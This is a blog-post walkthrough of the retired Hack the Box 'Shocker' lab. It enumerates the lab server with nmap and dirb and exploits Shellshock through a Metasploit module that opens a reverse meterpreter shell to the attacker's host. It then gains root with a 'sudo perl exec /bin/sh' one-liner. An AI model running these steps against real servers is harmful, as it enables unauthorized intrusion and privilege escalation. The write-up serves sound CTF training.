@@ -1,0 +1,311 @@
+
+								
+																		Hack the Box Challenge: Shocker Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on April 3, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “Shocker” which is lab presented by Hack the Box for making online penetration practices according to your experience level. HTB have two partitions of lab i.e. Active and retired since we can’t submit write up of any Active lab, therefore, we have chosen retried Shocker lab.
+Level: Beginners
+Task: find user.txt and root.txt file in the victim’s machine.
+Let’s Breach!!!
+Firstly let’s enumerate ports in context to identify running services and open ports of victim’s machine by using the most popular tool Nmap.
+
+		
+		
+			
+			
+			
+			
+nmap -A 10.10.10.56
+			
+				
+					
+				
+					1
+				
+						nmap -A 10.10.10.56
+					
+				
+			
+		
+
+Awesome!! Nmap has done a remarkable job by dumping the details of services running on open port 80, 2222.
+
+Knowing port 80 is open on the victim’s network we preferred to explore his IP in the browser and the following image as shown below.
+
+Next, we use the dirb tool of kali to enumerate the directories and found some important directories such as /cgi-bin, index.html, server-status
+
+		
+		
+			
+			
+			
+			
+dirb http://10.10.10.56
+			
+				
+					
+				
+					1
+				
+						dirb http://10.10.10.56
+					
+				
+			
+		
+
+
+As /cgi-bin / is a restricted directory, let’s look for a .sh file in the directory using dirb
+
+		
+		
+			
+			
+			
+			
+dirb http://10.10.10.56/cgi-bin -X .sh
+			
+				
+					
+				
+					1
+				
+						dirb http://10.10.10.56/cgi-bin -X .sh
+					
+				
+			
+		
+
+
+Great we have the user.sh in the cgi-bin directory. We downloaded the user.sh by opening the URL 
+
+		
+		
+			
+			
+			
+			
+http://10.10.10.56/cgi-bin/user.sh
+			
+				
+					
+				
+					1
+				
+						http://10.10.10.56/cgi-bin/user.sh
+					
+				
+			
+		
+
+Now let’s open the user.sh file using cat
+
+		
+		
+			
+			
+			
+			
+cat user.sh
+			
+				
+					
+				
+					1
+				
+						cat user.sh
+					
+				
+			
+		
+
+If you will Google for Apache web server with URI of /cgi-bin/ then you will realize that it could be Shellshock vulnerability, therefore, let for its exploitation using Metasploit.
+
+Open a terminal type msfconsole for loading metasploit framework and use following module. This module targets CGI scripts in the Apache web server by setting the HTTP_USER_AGENT environment variable to a malicious function definition.
+
+		
+		
+			
+			
+			
+			
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+msf exploit(apache_mod_cgi_bash_env_exec) &gt;set rhost 10.10.10.56
+msf exploit(apache_mod_cgi_bash_env_exec) &gt;set lhost 10.10.14.6
+msf exploit(apache_mod_cgi_bash_env_exec) &gt;set targeturi /cgi-bin/user.sh
+msf exploit(apache_mod_cgi_bash_env_exec) &gt;expoit
+			
+				
+					
+				
+					12345
+				
+						use exploit/multi/http/apache_mod_cgi_bash_env_execmsf exploit(apache_mod_cgi_bash_env_exec) &gt;set rhost 10.10.10.56msf exploit(apache_mod_cgi_bash_env_exec) &gt;set lhost 10.10.14.6msf exploit(apache_mod_cgi_bash_env_exec) &gt;set targeturi /cgi-bin/user.shmsf exploit(apache_mod_cgi_bash_env_exec) &gt;expoit
+					
+				
+			
+		
+
+And we got victim’s reverse connection through meterpreter session 1 and hence our prediction is true the target was vulnerable to shellshock.
+
+Now let’s finish the task by grabbing user.txt and root.txt file. First I move into /home directory and check available files and directories inside it.
+
+		
+		
+			
+			
+			
+			
+cd /home
+ls
+			
+				
+					
+				
+					12
+				
+						cd /homels
+					
+				
+			
+		
+
+Here one directory shelly, when I explore /shelly I saw user.txt and use cat command for reading.
+
+		
+		
+			
+			
+			
+			
+cd shelly
+ls
+cat user.txt
+			
+				
+					
+				
+					123
+				
+						cd shellylscat user.txt
+					
+				
+			
+		
+
+Great!!  Here we had completed 1st task now move to 2nd tasK
+
+For accessing root directory we need root privilege therefore next we use python one-liner for spawning pty shell.
+Great!!  I logged in successfully and check shelly’s privileged and roles using sudo -l and found he has root privileged and an indication for a directory /usr/bin/perl with NOPASSWD. Now let’s get the root.txt by executing the following command.
+
+		
+		
+			
+			
+			
+			
+sudo perl –e 'exec "/bin/sh"'
+id
+ls
+cat root.txt
+			
+				
+					
+				
+					1234
+				
+						sudo perl –e 'exec "/bin/sh"'idlscat root.txt
+					
+				
+			
+		
+
+We have successfully completed the 2nd task.
+Enjoy Hacking!!
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
